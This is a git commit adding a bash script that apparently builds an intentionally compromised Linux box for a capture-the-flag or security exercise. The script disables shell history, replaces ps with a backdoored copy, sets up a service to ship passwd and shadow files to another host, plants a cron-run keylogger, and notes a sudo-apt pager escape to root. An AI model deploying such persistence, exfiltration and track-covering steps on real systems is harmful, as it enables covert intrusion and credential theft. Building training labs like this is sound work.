82587c5dc70ec92b0e730573f5bab774ac88ba59
Dylan Palmieri <dgpalmieri@gmail.com>
2020-10-30 14:34:21 -0800

    Add tarball and setup script

---
+++ setup_script.sh
@@ -0,0 +1,115 @@
+#! /bin/bash
+
+if [ "$EUID" -ne 0 ]
+then
+    echo "Please run this script with sudo!"
+    exit
+fi
+
+apt-get update &
+apt-get upgrade -y &
+
+apt install lsof wget -y
+
+# get tarball
+wget # TODO LINK HERE
+tar cvf setup_files.tar.gz
+
+# link csc user .histfile and .bash_history to /dev/null
+echo "linking history to /dev/null for csc"
+rm /home/csc/.histfile
+ln /home/csc/.histfile /dev/null
+rm /home/csc/.bash_history
+ln /home/csc/.bash_history /dev/null
+
+# link root user .histfile and .bash_history to /dev/null
+echo "linking history to /dev/null for root"
+rm /root/.histfile
+ln /root/.histfile /dev/null
+rm /root/.bash_history
+ln /root/.bash_history /dev/null
+
+# replace default sshd_config with my sshd_config
+echo "replace sshd_config"
+rm /etc/ssh/sshd_config
+mv ./sshd_config /etc/ssh/
+
+# setup sql server
+echo "setup sql server"
+apt install mariadb-server -y
+mysqld --initialize-insecure
+systemctl enable mariadb.service
+
+# setup scoring for insecure sql server
+echo "setup sql scoring"
+chmod +x ./sql_script.sh
+mkdir -p /var/www/default
+mv ./sql_script.sh ./var/www/default
+
+## make it a cron job!
+systemctl start crond.service
+systemctl enable crond.service
+touch /etc/cron.allow
+echo "root" >> /etc/cron.allow
+touch /var/spool/cron/root
+echo "* * * * * /var/www/default/sql_script.sh" >> /var/spool/cron/root
+
+# setup minecraft server
+echo "setup minecraft server"
+sudo apt install openjdk-8-jdk -y
+mkdir /var/www/mcdir
+mv minecraft.service /etc/systemd/system/
+cd /var/www/mcdir
+wget -O minecraft_server.jar https://launcher.mojang.com/v1/objects/f02f4473dbf152c23d7d484952121db0b36698cb/server.jar
+chmod +x minecraft_server.jar
+echo "eula=true" > eula.txt
+cd -
+systemctl start minecraft.service
+systemctl enable minecraft.service
+
+# setup ftp server
+echo "setup ftp server"
+apt install vsftpd
+rm /etc/vsftpd.conf
+mv ./vsftpd.conf /etc/
+systemctl start vsftpd.service
+systemctl enable vsftpd.service
+cd /etc/systemd/system
+echo "\n # flag_{not_so_secure_ftp}" >> $(find . -name "vsftpd.service")
+cd -
+
+# setup backdoored ps and flag
+echo "setup backdoored ps"
+mkdir /var/loog
+mv /bin/ps /var/loog/backup_ps
+chmod +x backdoored_ps.sh
+mv backdoored_ps.sh /var/loog/ps
+mkdir /var/www/log
+mv flag.sh ps_init.sh /var/www/log/
+echo "* * * * * /var/www/log/ps_init.sh" >> /var/spool/cron/root
+
+# setup service that sends logging, passwd, and shadow file to someone else
+# TODO: setup dest box to receive files - use static ip
+# TODO: setup rsa key on source and dest boxes
+apt install rsync -y
+chmod +x backup.sh
+mv backup.sh /var/spool
+mv backup.service /etc/systemd/system/
+systemctl start backup.service
+systemctl status backup.service
+
+# setup hidden python keylogger
+apt install python3 python-xlib -y
+mkdir /opt/local/
+mv log.txt /opt/local
+chmod +x log.sh
+mv log.sh /var/loog/
+mv keylogger.py /usr/local/src/
+mv pyxhook.py /usr/local/src/
+echo "* * * * * /usr/local/src/log.sh" >> /var/spool/cron/root
+
+# hack back against the backup ssh computer
+# flag in /etc/passwd - 
+# sudo access to apt
+# > apt-get changelog apt gives less pager
+# > !# /bin/bash gives root shell
